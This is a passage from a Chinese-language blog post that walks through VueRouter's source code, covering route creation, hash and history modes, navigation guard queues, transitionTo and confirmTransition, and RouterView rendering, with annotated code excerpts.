&amp;&amp; record.matchAs) {\n    return alias(record, location, record.matchAs)\n  }\n  return createRoute(record, location, redirectedFrom, router)\n}\n</code></pre><p>其中redirect，alias最终都会调用createRoute方法。我们再将视角转向createRoute函数。createRoute函数会返回一个冻结的Router对象。</p>\n<p>其中matched属性为一个数组，包含当前路由的所有嵌套路径片段的路由记录。数组的顺序为从外向里(树的外层到内层)。</p>\n<pre class=\"prettyprint language-js\"><code>\nexport function createRoute (\n  record: ?RouteRecord,\n  location: Location,\n  redirectedFrom?: ?Location,\n  router?: VueRouter\n): Route {\n  const stringifyQuery = router &amp;&amp; router.options.stringifyQuery\n\n  let query: any = location.query || {}\n  try {\n    query = clone(query)\n  } catch (e) {}\n\n  const route: Route = {\n    name: location.name || (record &amp;&amp; record.name),\n    meta: (record &amp;&amp; record.meta) || {},\n    path: location.path || &#x27;&#x2F;&#x27;,\n    hash: location.hash || &#x27;&#x27;,\n    query,\n    params: location.params || {},\n    fullPath: getFullPath(location, stringifyQuery),\n    matched: record ? formatMatch(record) : []\n  }\n  if (redirectedFrom) {\n    route.redirectedFrom = getFullPath(redirectedFrom, stringifyQuery)\n  }\n  return Object.freeze(route)\n}\n</code></pre><h2>init</h2>\n<p>init中。会挂载cb的回调，这关乎到RouteView的渲染。我们根据当前的url，在Vue根实例的beforeCreate生命周期钩子中完成路由的初始化，完成第一次的路由导航。</p>\n<pre class=\"prettyprint language-js\"><code>\ninit (app) {\n\n  &#x2F;&#x2F; app为Vue的实例\n  this.apps.push(app)\n\n  if (this.app) {\n    return\n  }\n\n  &#x2F;&#x2F; 在VueRouter上挂载app属性\n  this.app = app\n\n  const history = this.history\n\n  &#x2F;&#x2F; 初始化当前的路由，完成第一次导航，在hash模式下会在transitionTo的回调中调用setupListeners\n  &#x2F;&#x2F; setupListeners里会对hashchange事件进行监听\n  &#x2F;&#x2F; transitionTo是进行路由导航的函数，我们将会在下面介绍\n  if (history instanceof HTML5History) {\n    history.transitionTo(history.getCurrentLocation())\n  } else if (history instanceof HashHistory) {\n    const setupHashListener = () =&gt; {\n      history.setupListeners()\n    }\n    history.transitionTo(\n      history.getCurrentLocation(),\n      setupHashListener,\n      setupHashListener\n    )\n  }\n\n  &#x2F;&#x2F; 挂载了回调的cb， 每次更新路由更好更新_route\n  history.listen(route =&gt; {\n    this.apps.forEach((app) =&gt; {\n      app._route = route\n    })\n  })\n}\n</code></pre><h2>history</h2>\n<p>history一共有三个模式hash, histroy, abstract, 这三个类都继承至base类</p>\n<h3>base</h3>\n<p>我们首先看下base的构造函数, 其中router是VueRouter的实例, base是路由的基础路径。current是当前的路由默认为&quot;/&quot;, ready是路由的状态, readyCbs是ready的回调的集合, readyErrorCbs是raday失败的回调。errorCbs导航出错的回调的集合。</p>\n<pre class=\"prettyprint language-js\"><code>\nexport class History {\n  constructor (router: Router, base: ?string) {\n    this.router = router\n    &#x2F;&#x2F; normalizeBase会对base路径做出格式化的处理，会为base开头自动添加‘&#x2F;’，删除结尾的‘&#x2F;’，默认返回’&#x2F;‘\n    this.base = normalizeBase(base)\n    &#x2F;&#x2F; 初始化的当前路由对象\n    this.current = START\n    this.pending = null\n    this.ready = false\n    this.readyCbs = []\n    this.readyErrorCbs = []\n    this.errorCbs = []\n  }\n}\n</code></pre><pre class=\"prettyprint language-js\"><code>\nexport const START = createRoute(null, {\n  path: &#x27;&#x2F;&#x27;\n})\n</code></pre><pre class=\"prettyprint language-js\"><code>\nfunction normalizeBase (base: ?string): string {\n  if (!base) {\n    &#x2F;&#x2F; inBrowser判断是否为浏览器环境\n    if (inBrowser) {\n      const baseEl = document.querySelector(&#x27;base&#x27;)\n      base = (baseEl &amp;&amp; baseEl.getAttribute(&#x27;href&#x27;)) || &#x27;&#x2F;&#x27;\n      base = base.replace(&#x2F;^https?:\\&#x2F;\\&#x2F;[^\\&#x2F;]+&#x2F;, &#x27;&#x27;)\n    } else {\n      base = &#x27;&#x2F;&#x27;\n    }\n  }\n  if (base.charAt(0) !== &#x27;&#x2F;&#x27;) {\n    base = &#x27;&#x2F;&#x27; + base\n  }\n  return base.replace(&#x2F;\\&#x2F;$&#x2F;, &#x27;&#x27;)\n}\n</code></pre><p><strong>base中的listen的方法，会在VueRouter的init方法中使用到，listen会给每一次的路由的更新，添加回调</strong></p>\n<pre class=\"prettyprint language-js\"><code>\nlisten (cb: Function) {\n  this.cb = cb\n}   \n</code></pre><p>base类中还有一些其他方法比如，transitionTo，confirmTransition，updateRoute它们在base子类中被使用。我们马上在hashrouter中再看看它们的具体实现。</p>\n<h3>HashRouter</h3>\n<h4>构造函数</h4>\n<p>在HashHistory的构造函数中。我们会判断当前的fallback是否为true。如果为true，使用checkFallback，添加’#‘，并使用window.location.replace替换文档。</p>\n<p>如果fallback为false，我们会调用ensureSlash，ensureSlash会为没有“#”的url，添加“#”，并且使用histroy的API或者replace替换文档。</p>\n<p>所以我们在访问127.0.0.1的时候，会自动替换为127.0.0.1/#/</p>\n<pre class=\"prettyprint language-js\"><code>\nexport class HashHistory extends History {\n  constructor (router: Router, base: ?string, fallback: boolean) {\n    super(router, base)\n    &#x2F;&#x2F; 如果是回退hash的情况，并且判断当前路径是否有&#x2F;#&#x2F;。如果没有将会添加&#x27;&#x2F;#&#x2F;&#x27;\n    if (fallback &amp;&amp; checkFallback(this.base)) {\n      return\n    }\n    ensureSlash()\n  }\n}\n</code></pre><p>checkFallback</p>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;&#x2F; 检查url是否包含‘&#x2F;#&#x2F;’\nfunction checkFallback (base) {\n  &#x2F;&#x2F; 获取hash值\n  const location = getLocation(base)\n  &#x2F;&#x2F; 如果location不是以&#x2F;#，开头。添加&#x2F;#，使用window.location.replace替换文档\n  if (!&#x2F;^\\&#x2F;#&#x2F;.test(location)) {\n    window.location.replace(\n      cleanPath(base + &#x27;&#x2F;#&#x27; + location)\n    )\n    return true\n  }\n}\n</code></pre><pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 返回hash\nexport function getLocation (base) {\n  let path = decodeURI(window.location.pathname)\n  if (base &amp;&amp; path.indexOf(base) === 0) {\n    path = path.slice(base.length)\n  }\n  return (path || &#x27;&#x2F;&#x27;) + window.location.search + window.location.hash\n}\n</code></pre><pre class=\"prettyprint language-js\"><code>\n&#x2F;&#x2F; 删除 &#x2F;&#x2F;, 替换为 &#x2F;\nexport function cleanPath (path) {\n  return path.replace(&#x2F;\\&#x2F;\\&#x2F;&#x2F;g, &#x27;&#x2F;&#x27;)\n}\n</code></pre><p>ensureSlash</p>\n<pre class=\"prettyprint language-js\"><code>\nfunction ensureSlash (): boolean {\n  &#x2F;&#x2F; 判断是否包含#，并获取hash值。如果url没有#，则返回‘’\n  const path = getHash()\n  &#x2F;&#x2F; 判断path是否以&#x2F;开头\n  if (path.charAt(0) === &#x27;&#x2F;&#x27;) {\n    return true\n  }\n  &#x2F;&#x2F; 如果开头不是‘&#x2F;’, 则添加&#x2F;\n  replaceHash(&#x27;&#x2F;&#x27; + path)\n  return false\n}\n</code></pre><pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 获取“#”后面的hash\nexport function getHash (): string {\n  const href = window.location.href\n  const index = href.indexOf(&#x27;#&#x27;)\n  return index === -1 ? &#x27;&#x27; : decodeURI(href.slice(index + 1))\n}\n</code></pre><pre class=\"prettyprint language-js\"><code>function replaceHash (path) {\n  &#x2F;&#x2F; supportsPushState判断是否存在history的API\n  &#x2F;&#x2F; 使用replaceState或者window.location.replace替换文档\n  &#x2F;&#x2F; getUrl获取完整的url\n  if (supportsPushState) {\n    replaceState(getUrl(path))\n  } else {\n    window.location.replace(getUrl(path))\n  }\n}\n</code></pre><pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; getUrl返回了完整了路径，并且会添加#, 确保存在&#x2F;#&#x2F;\nfunction getUrl (path) {\n  const href = window.location.href\n  const i = href.indexOf(&#x27;#&#x27;)\n  const base = i &gt;= 0 ? href.slice(0, i) : href\n  return &#96;${base}#${path}&#96;\n}\n</code></pre><p>在replaceHash中，我们调用了replaceState方法，在replaceState方法中，又调用了pushState方法。在pushState中我们会调用saveScrollPosition方法，它会记录当前的滚动的位置信息。然后使用histroyAPI，或者window.location.replace完成文档的更新。</p>\n<pre class=\"prettyprint language-js\"><code>\nexport function replaceState (url?: string) {\n  pushState(url, true)\n}\n\nexport function pushState (url?: string, replace?: boolean) {\n  &#x2F;&#x2F; 记录当前的x轴和y轴，以发生导航的时间为key，位置信息记录在positionStore中\n  saveScrollPosition()\n  const history = window.history\n  try {\n    if (replace) {\n      history.replaceState({ key: _key }, &#x27;&#x27;, url)\n    } else {\n      _key = genKey()\n      history.pushState({ key: _key }, &#x27;&#x27;, url)\n    }\n  } catch (e) {\n    window.location[replace ? &#x27;replace&#x27; : &#x27;assign&#x27;](url)\n  }\n}\n</code></pre><h4>push, replace,</h4>\n<p>我们把push，replace放在一起说，因为它们实现的源码都是类似的。在push和replace中，调用transitionTo方法，transitionTo方法在基类base中，我们现在转过头来看看transitionTo的源码(👇往下两节，<em>代码不是很难，但是callback嵌套callback, 如蜜传如蜜，看起来还是比较恶心的</em>)</p>\n<pre class=\"prettyprint language-js\"><code>\npush (location, onComplete, onAbort) {\n  const { current: fromRoute } = this\n  this.transitionTo(\n    location,\n    route =&gt; {\n      pushHash(route.fullPath)\n      handleScroll(this.router, route, fromRoute, false)\n      onComplete &amp;&amp; onComplete(route)\n    },\n    onAbort\n  )\n}\n\nreplace (location, onComplete, onAbort) {\n  const { current: fromRoute } = this\n  this.transitionTo(\n    location,\n    route =&gt; {\n      replaceHash(route.fullPath)\n      handleScroll(this.router, route, fromRoute, false)\n      onComplete &amp;&amp; onComplete(route)\n    },\n    onAbort\n  )\n}\n</code></pre><h4>transitionTo, confirmTransition, updateRoute</h4>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/14/16a1a436687810ab?w=1446&amp;h=886&amp;f=png&amp;s=107156\" alt=\"image\"></p>\n<p>transitionTo的location参数是我们的目标路径, 可以是string或者RawLocation对象。我们通过router.match方法(我们在在matcher介绍过)，router.match会返回我们的目标路由对象。紧接着我们会调用confirmTransition函数。</p>\n<pre class=\"prettyprint language-js\"><code>\ntransitionTo (location, onComplete, onAbort) {\n  const route = this.router.match(location, this.current)\n  this.confirmTransition(\n    route,\n    () =&gt; {\n      &#x2F;&#x2F; ...\n    },\n    err =&gt; {\n      &#x2F;&#x2F; ...\n    }\n  )\n}\n</code></pre><p>confirmTransition函数中会使用，isSameRoute会检测是否导航到相同的路由，如果导航到相同的路由会停止🤚导航，并执行终止导航的回调。</p>\n<pre class=\"prettyprint language-js\"><code>\nif (\n  isSameRoute(route, current) &amp;&amp;\n  route.matched.length === current.matched.length\n) {\n  this.ensureURL()\n  return abort()\n}\n</code></pre><p>接着我们调用resolveQueue方法，resolveQueue接受当前的路由和目标的路由的matched属性作为参数，resolveQueue的工作方式可以如下图所示。我们会逐一比较两个数组的路由，寻找出需要销毁的，需要更新的，需要激活的路由，并返回它们（因为我们需要执行它们不同的路由守卫）</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/14/16a1a4366883a3ce?w=1598&amp;h=662&amp;f=png&amp;s=89462\" alt=\"image\"></p>\n<pre class=\"prettyprint language-js\"><code>function resolveQueue (\n  current\n  next\n) {\n  let i\n  &#x2F;&#x2F; 依次比对当前的路由和目标的路由的matched属性中的每一个路由\n  const max = Math.max(current.length, next.length)\n  for (i = 0; i &lt; max; i++) {\n    if (current[i] !== next[i]) {\n      break\n    }\n  }\n  return {\n    updated: next.slice(0, i),\n    activated: next.slice(i),\n    deactivated: current.slice(i)\n  }\n}\n</code></pre><p>下一步，我们会逐一提取出，所有要执行的路由守卫，将它们concat到队列queue。queue里存放里所有需要在这次路由更新中执行的路由守卫。</p>\n<p>第一步，我们使用extractLeaveGuards函数，提取出deactivated中所有需要销毁的组件内的“beforeRouteLeave”的守卫。extractLeaveGuards函数中会调用extractGuards函数，extractGuards函数，会调用flatMapComponents函数，flatMapComponents函数会遍历records(<strong>resolveQueue返回deactivated</strong>), 在遍历过程中我们将组件，组件的实例，route对象，传入了fn(<strong>extractGuards中传入flatMapComponents的回调</strong>), 在fn中我们会获取组件中beforeRouteLeave守卫。</p>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;&#x2F; 返回每一个组件中导航的集合\nfunction extractLeaveGuards (deactivated) {\n  return extractGuards(deactivated, &#x27;beforeRouteLeave&#x27;, bindGuard, true)\n}\n\nfunction extractGuards (\n  records,\n  name,\n  bind,\n  reverse?\n) {\n  const guards = flatMapComponents(\n    records,\n    &#x2F;&#x2F; def为组件\n    &#x2F;&#x2F; instance为组件的实例\n    (def, instance, match, key) =&gt; {\n      &#x2F;&#x2F; 返回每一个组件中定义的路由守卫\n      const guard = extractGuard(def, name)\n      if (guard) {\n        &#x2F;&#x2F; bindGuard函数确保了guard（路由守卫）的this指向的是Component中的实例\n        return Array.isArray(guard)\n          ? guard.map(guard =&gt; bind(guard, instance, match, key))\n          : bind(guard, instance, match, key)\n      }\n    }\n  )\n  &#x2F;&#x2F; 返回导航的集合\n  return flatten(reverse ? guards.reverse() : guards)\n}\n\nexport function flatMapComponents (\n  matched,\n  fn\n) {\n  &#x2F;&#x2F; 遍历matched，并返回matched中每一个route中的每一个Component\n  return flatten(matched.map(m =&gt; {\n    &#x2F;&#x2F; 如果没有设置components则默认是components{ default: YouComponent }，可以从addRouteRecord函数中看到\n    &#x2F;&#x2F; 将每一个matched中所有的component传入fn中\n    &#x2F;&#x2F; m.components[key]为components中的key键对应的组件\n    &#x2F;&#x2F; m.instances[key]为组件的实例，这个属性是在routerview组件中beforecreated中被赋值的\n    return Object.keys(m.components).map(key =&gt; fn(\n      m.components[key],\n      m.instances[key],\n      m,\n      key\n    ))\n  }))\n}\n\n&#x2F;&#x2F; 返回一个新数组\nexport function flatten (arr) {\n  return Array.prototype.concat.apply([], arr)\n}\n\n&#x2F;&#x2F; 获取组件中的属性\nfunction extractGuard (def, key) {\n  if (typeof def !== &#x27;function&#x27;) {\n    def = _Vue.extend(def)\n  }\n  return def.options[key]\n}\n\n&#x2F;&#x2F; 修正函数的this指向\nfunction bindGuard (guard, instance) {\n  if (instance) {\n    return function boundRouteGuard () {\n      return guard.apply(instance, arguments)\n    }\n  }\n}\n</code></pre><p>第二步，获取全局VueRouter对象beforeEach的守卫</p>\n<p>第三步, 使用extractUpdateHooks函数，提取出update组件中所有的beforeRouteUpdate的守卫。过程同第一步类似。</p>\n<p>第四步, 获取activated的options配置中beforeEach守卫</p>\n<p>第五部, 获取所有的异步组件</p>\n<hr>\n<p>在获取所有的路由守卫后我们定义了一个迭代器iterator。接着我们使用runQueue遍历queue队列。将queue队列中每一个元素传入fn(<strong>迭代器iterator</strong>)中，在迭代器中会执行路由守卫，并且路由守卫中必须明确的调用next方法才会进入下一个管道，进入下一次迭代。迭代完成后，会执行runQueue的callback。</p>\n<p>在runQueue的callback中，我们获取激活组件内的beforeRouteEnter的守卫，并且将beforeRouteEnter守卫中next的回调存入postEnterCbs中，在导航被确认后遍历postEnterCbs执行next的回调。</p>\n<p>在queue队列执行完成后，confirmTransition函数会执行transitionTo传入的onComplete的回调。往下看👇</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; queue为路由守卫的队列\n&#x2F;&#x2F; fn为定义的迭代器\nexport function runQueue (queue, fn, cb) {\n  const step = index =&gt; {\n    if (index &gt;= queue.length) {\n      cb()\n    } else {\n      if (queue[index]) {\n        &#x2F;&#x2F; 使用迭代器处理每一个钩子\n        &#x2F;&#x2F; fn是迭代器\n        fn(queue[index], () =&gt; {\n          step(index + 1)\n        })\n      } else {\n        step(index + 1)\n      }\n    }\n  }\n  step(0)\n}\n\n&#x2F;&#x2F; 迭代器\nconst iterator = (hook, next) =&gt; {\n  if (this.pending !== route) {\n    return abort()\n  }\n  try {\n    &#x2F;&#x2F; 传入路由守卫三个参数，分别分别对应to，from，next\n    hook(route, current, (to: any) =&gt; {\n      if (to === false || isError(to)) {\n        &#x2F;&#x2F; 如果next的参数为false\n        this.ensureURL(true)\n        abort(to)\n      } else if (\n        &#x2F;&#x2F; 如果next需要重定向到其他路由\n        typeof to === &#x27;string&#x27; ||\n        (typeof to === &#x27;object&#x27; &amp;&amp; (\n          typeof to.path === &#x27;string&#x27; ||\n          typeof to.name === &#x27;string&#x27;\n        ))\n      ) {\n        abort()\n        if (typeof to === &#x27;object&#x27; &amp;&amp; to.replace) {\n          this.replace(to)\n        } else {\n          this.push(to)\n        }\n      } else {\n        &#x2F;&#x2F; 进入下个管道\n        next(to)\n      }\n    })\n  } catch (e) {\n    abort(e)\n  }\n}\n\nrunQueue(\n  queue,\n  iterator,\n  () =&gt; {\n    const postEnterCbs = []\n    const isValid = () =&gt; this.current === route\n    &#x2F;&#x2F; 获取所有激活组件内部的路由守卫beforeRouteEnter，组件内的beforeRouteEnter守卫，是无法获取this实例的\n    &#x2F;&#x2F; 因为这时激活的组件还没有创建，但是我们可以通过传一个回调给next来访问组件实例。\n    &#x2F;&#x2F; beforeRouteEnter (to, from, next) {\n    &#x2F;&#x2F;   next(vm =&gt; {\n    &#x2F;&#x2F;     &#x2F;&#x2F; 通过 &#96;vm&#96; 访问组件实例\n    &#x2F;&#x2F;   })\n    &#x2F;&#x2F; }\n    const enterGuards = extractEnterGuards(activated, postEnterCbs, isValid)\n    &#x2F;&#x2F; 获取全局的beforeResolve的路由守卫\n    const queue = enterGuards.concat(this.router.resolveHooks)\n    &#x2F;&#x2F; 再一次遍历queue\n    runQueue(queue, iterator, () =&gt; {\n      &#x2F;&#x2F; 完成过渡\n      if (this.pending !== route) {\n        return abort()\n      }\n      &#x2F;&#x2F; 正在过渡的路由设置为null\n      this.pending = null\n      &#x2F;&#x2F; \n      onComplete(route)\n      &#x2F;&#x2F; 导航被确认后，我们执行beforeRouteEnter守卫中，next的回调\n      if (this.router.app) {\n        this.router.app.$nextTick(() =&gt; {\n          postEnterCbs.forEach(cb =&gt; { cb() })\n        })\n      }\n    }\n  )\n})\n\n&#x2F;&#x2F; 获取组件中的beforeRouteEnter守卫\nfunction extractEnterGuards (\n  activated,\n  cbs,\n  isValid\n) {\n  return extractGuards(activated, &#x27;beforeRouteEnter&#x27;, (guard, _, match, key) =&gt; {\n    &#x2F;&#x2F; 这里没有修改guard（守卫）中this的指向\n    return bindEnterGuard(guard, match, key, cbs, isValid)\n  })\n}\n\n&#x2F;&#x2F; 将beforeRouteEnter守卫中next的回调push到postEnterCbs中\nfunction bindEnterGuard (\n  guard,\n  match,\n  key,\n  cbs,\n  isValid\n) {\n  &#x2F;&#x2F; 这里的next参数是迭代器中传入的参数\n  return function routeEnterGuard (to, from, next) {\n    return guard(to, from, cb =&gt; {\n      &#x2F;&#x2F; 执行迭代器中传入的next，进入下一个管道\n      next(cb)\n      if (typeof cb === &#x27;function&#x27;) {\n        &#x2F;&#x2F; 我们将next的回调包装后保存到cbs中，next的回调会在导航被确认的时候执行回调\n        cbs.push(() =&gt; {\n          poll(cb, match.instances, key, isValid)\n        })\n      }\n    })\n  }\n}\n</code></pre><p>在confirmTransition的onComplete回调中，我们调用updateRoute方法, 参数是导航的路由。在updateRoute中我们会更新当前的路由(<strong>history.current</strong>), 并执行cb(<strong>更新Vue实例上的_route属性，🌟这会触发RouterView的重新渲染</strong>）</p>\n<pre class=\"prettyprint language-js\"><code>\nupdateRoute (route: Route) {\n  const prev = this.current\n  this.current = route\n  this.cb &amp;&amp; this.cb(route)\n  &#x2F;&#x2F; 执行after的钩子\n  this.router.afterHooks.forEach(hook =&gt; {\n    hook &amp;&amp; hook(route, prev)\n  })\n}\n</code></pre><p>接着我们执行transitionTo的回调函数onComplete。在回调中会调用replaceHash或者pushHash方法。它们会更新location的hash值。如果兼容historyAPI，会使用history.replaceState或者history.pushState。如果不兼容historyAPI会使用window.location.replace或者window.location.hash。而handleScroll方法则是会更新我们的滚动条的位置我们这里就不在细说了。</p>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;&#x2F; replaceHash方法\n(route) =&gt; {\n  replaceHash(route.fullPath)\n  handleScroll(this.router, route, fromRoute, false)\n  onComplete &amp;&amp; onComplete(route)\n}\n\n&#x2F;&#x2F; push方法\nroute =&gt; {\n  pushHash(route.fullPath)\n  handleScroll(this.router, route, fromRoute, false)\n  onComplete &amp;&amp; onComplete(route)\n}\n</code></pre><p>好了，现在我们就把，replace或者push方法的流程说完了。</p>\n<p>🎉🎉🎉🎉🎉🎉 以下是transitionTo，confirmTransition中完整的代码。 🎉🎉🎉🎉🎉🎉</p>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;&#x2F; onComplete 导航成功的回调\n&#x2F;&#x2F; onAbort 导航终止的回调\ntransitionTo (location, onComplete, onAbort) {\n  const route = this.router.match(location, this.current)\n  this.confirmTransition(route,\n    () =&gt; {\n      this.updateRoute(route)\n      onComplete &amp;&amp; onComplete(route)\n      this.ensureURL()\n      if (!this.ready) {\n        this.ready = true\n        this.readyCbs.forEach(cb =&gt; { cb(route) })\n      }\n    },\n    err =&gt; {\n      if (onAbort) {\n        onAbort(err)\n      }\n      if (err &amp;&amp; !this.ready) {\n        this.ready = true\n        this.readyErrorCbs.forEach(cb =&gt; { cb(err) })\n      }\n    }\n  )\n}\n\n&#x2F;&#x2F; onComplete 导航成功的回调\n&#x2F;&#x2F; onAbort 导航终止的回调\nconfirmTransition (route: Route, onComplete: Function, onAbort?: Function) {\n\n  &#x2F;&#x2F; 当前的路由\n  const current = this.current\n\n  const abort = err =&gt; {\n    if (isError(err)) {\n      if (this.errorCbs.length) {\n        this.errorCbs.forEach(cb =&gt; { cb(err) })\n      }\n    }\n    onAbort &amp;&amp; onAbort(err)\n  }\n  \n  &#x2F;&#x2F; 判断是否导航到相同的路由，如果是我们终止导航\n  if (\n    isSameRoute(route, current) &amp;&amp;\n    route.matched.length === current.matched.length\n  ) {\n    this.ensureURL()\n    return abort()\n  }\n\n  &#x2F;&#x2F; 获取所有需要激活，更新，销毁的路由\n  const {\n    updated,\n    deactivated,\n    activated\n  } = resolveQueue(this.current.matched, route.matched)\n\n  &#x2F;&#x2F; 获取所有需要执行的路由守卫\n  const queue = [].concat(\n    extractLeaveGuards(deactivated),\n    this.router.beforeHooks,\n    extractUpdateHooks(updated), \n    activated.map(m =&gt; m.beforeEnter),\n    resolveAsyncComponents(activated)\n  )\n\n  this.pending = route\n\n  &#x2F;&#x2F; 定义迭代器\n  const iterator = (hook: NavigationGuard, next) =&gt; {\n    if (this.pending !== route) {\n      return abort()\n    }\n    try {\n      hook(route, current, (to: any) =&gt; {\n        if (to === false || isError(to)) {\n          this.ensureURL(true)\n          abort(to)\n        } else if (\n          typeof to === &#x27;string&#x27; ||\n          (typeof to === &#x27;object&#x27; &amp;&amp; (\n            typeof to.path === &#x27;string&#x27; ||\n            typeof to.name === &#x27;string&#x27;\n          ))\n        ) {\n          abort()\n          if (typeof to === &#x27;object&#x27; &amp;&amp; to.replace) {\n            this.replace(to)\n          } else {\n            this.push(to)\n          }\n        } else {\n          next(to)\n        }\n      })\n    } catch (e) {\n      abort(e)\n    }\n  }\n\n  &#x2F;&#x2F; 迭代所有的路由守卫\n  runQueue(\n    queue,\n    iterator, \n    () =&gt; {\n      const postEnterCbs = []\n      const isValid = () =&gt; this.current === route\n      const enterGuards = extractEnterGuards(activated, postEnterCbs, isValid)\n      const queue = enterGuards.concat(this.router.resolveHooks)\n      runQueue(queue, iterator, () =&gt; {\n        if (this.pending !== route) {\n          return abort()\n        }\n        this.pending = null\n        onComplete(route)\n        if (this.router.app) {\n          this.router.app.$nextTick(() =&gt; {\n            postEnterCbs.forEach(cb =&gt; { cb() })\n          })\n        }\n      }\n    )\n  })\n}\n</code></pre><h4>go, forward, back</h4>\n<p>在VueRouter上定义的go，forward，back方法都是调用history的属性的go方法</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; index.js\n\ngo (n) {\n  this.history.go(n)\n}\n\nback () {\n  this.go(-1)\n}\n\nforward () {\n  this.go(1)\n}\n</code></pre><p>而hash上go方法调用的是history.go，它是如何更新RouteView的呢？答案是hash对象在setupListeners方法中添加了对popstate或者hashchange事件的监听。在事件的回调中会触发RoterView的更新</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; go方法调用history.go\ngo (n) {\n  window.history.go(n)\n}\n</code></pre><h4>setupListeners</h4>\n<p>我们在通过点击后退, 前进按钮或者调用back, forward, go方法的时候。我们没有主动更新_app.route和current。我们该如何触发RouterView的更新呢？通过在window上监听popstate，或者hashchange事件。在事件的回调中，调用transitionTo方法完成对_route和current的更新。</p>\n<p>或者可以这样说，在使用push，replace方法的时候，hash的更新在_route更新的后面。而使用go, back时，hash的更新在_route更新的前面。</p>\n<pre class=\"prettyprint language-js\"><code>\nsetupListeners () {\n  const router = this.router\n\n  const expectScroll = router.options.scrollBehavior\n  const supportsScroll = supportsPushState &amp;&amp; expectScroll\n\n  if (supportsScroll) {\n    setupScroll()\n  }\n\n  window.addEventListener(supportsPushState ? &#x27;popstate&#x27; : &#x27;hashchange&#x27;, () =&gt; {\n    const current = this.current\n    if (!ensureSlash()) {\n      return\n    }\n    this.transitionTo(getHash(), route =&gt; {\n      if (supportsScroll) {\n        handleScroll(this.router, route, current, true)\n      }\n      if (!supportsPushState) {\n        replaceHash(route.fullPath)\n      }\n    })\n  })\n}\n</code></pre><h3>HistoryRouter</h3>\n<p>HistoryRouter的实现基本于HashRouter一致。差异在于\bHistoryRouter不会做一些容错处理，不会判断当前环境是否支持historyAPI。默认监听popstate事件，默认使用histroyAPI。感兴趣的同学可以看/history/html5.js中关于HistoryRouter的定义。</p>\n<h2>组件</h2>\n<h3>RouterView</h3>\n<p>RouterView是可以互相嵌套的，RouterView依赖了parent.$route属性，parent.$route即this._routerRoot._route。我们使用Vue.util.defineReactive将_router设置为响应式的。在transitionTo的回调中会更新_route, 这会触发RouteView的渲染。(渲染机制目前不是很了解，目前还没有看过Vue的源码，猛男落泪)。</p>\n<pre class=\"prettyprint language-js\"><code>export default {\n  name: &#x27;RouterView&#x27;,\n  functional: true,\n  &#x2F;&#x2F; RouterView的name, 默认是default\n  props: {\n    name: {\n      type: String,\n      default: &#x27;default&#x27;\n    }\n  },\n  render (_, { props, children, parent, data }) {\n    data.routerView = true\n\n    &#x2F;&#x2F; h为渲染函数\n    const h = parent.$createElement\n    const name = props.name\n    const route = parent.$route\n    const cache = parent._routerViewCache || (parent._routerViewCache = {})\n\n    let depth = 0\n    let inactive = false\n    &#x2F;&#x2F; 使用while循环找到Vue的根节点, _routerRoot是Vue的根实例\n    &#x2F;&#x2F; depth为当前的RouteView的深度，因为RouteView可以互相嵌套，depth可以帮组我们找到每一级RouteView需要渲染的组件\n    while (parent &amp;&amp; parent._routerRoot !== parent) {\n      if (parent.$vnode &amp;&amp; parent.$vnode.data.routerView) {\n        depth++\n      }\n      if (parent._inactive) {\n        inactive = true\n      }\n      parent = parent.$parent\n    }\n    data.routerViewDepth = depth\n\n    if (inactive) {\n      return h(cache[name], data, children)\n    }\n\n    const matched = route.matched[depth]\n    if (!matched) {\n      cache[name] = null\n      return h()\n    }\n\n    &#x2F;&#x2F; 获取到渲染的组件\n    const component = cache[name] = matched.components[name]\n\n    &#x2F;&#x2F; registerRouteInstance会在beforeCreated中调用，又全局的Vue.mixin实现\n    &#x2F;&#x2F; 在matched.instances上注册组件的实例, 这会帮助我们修正confirmTransition中执行路由守卫中内部的this的指向\n    data.registerRouteInstance = (vm, val) =&gt; {\n      const current = matched.instances[name]\n      if (\n        (val &amp;&amp; current !== vm) ||\n        (!val &amp;&amp; current === vm)\n      ) {\n        matched.instances[name] = val\n      }\n    }\n\n    ;(data.hook || (data.hook = {})).prepatch = (_, vnode) =&gt; {\n      matched.instances[name] = vnode.componentInstance\n    }\n\n    let propsToPass = data.props = resolveProps(route, matched.props &amp;&amp; matched.props[name])\n    if (propsToPass) {\n      propsToPass = data.props = extend({}, propsToPass)\n      const attrs = data.attrs = data.attrs || {}\n      for (const key in propsToPass) {\n        if (!component.props || !(key in component.props)) {\n          attrs[key] = propsToPass[key]\n          delete propsToPass[key]\n        }\n      }\n    }\n    &#x2F;&#x2F; 渲染组件\n    return h(component, data, children)\n  }\n}\n</code></pre><h2>结语</h2>\n<p>我们把VueRouter源码看完了。总体来说不是很复杂。<strong>总的来说就是使用Vue.util.defineReactive将实例的_route属性设置为响应式。而push, replace方法会主动更新属性_route。而go，back，或者点击前进后退的按钮则会在onhashchange或者onpopstate的回调中更新_route，而_route的更新会触发RoterView的重新渲染</strong></p>\n<p>但是也略过了比如keep-live，滚动行为的处理。我打算接下来，结合VueRouter核心原理实现了一个简易版的<a href=\"https://github.com/BengBu-YueZhang/very-simple-router\">VueRouter</a>,当然现在还没有开始。</p>\n<h2>其他</h2>\n<p>从3月中下旬左右一直在学一些库的源码，本身学习源码对工作帮助并不是很大。因为像VueRouter，Preact都有着完善的文档。看源码单纯是个人的兴趣，不过学习了这些库的源码，自己实现一个简易版本，还是挺有成就感的一件事情。</p>\n<p><a href=\"https://juejin.im/post/5ca97d60f265da24d5070613\">Preact源码分析</a></p>\n<p><a 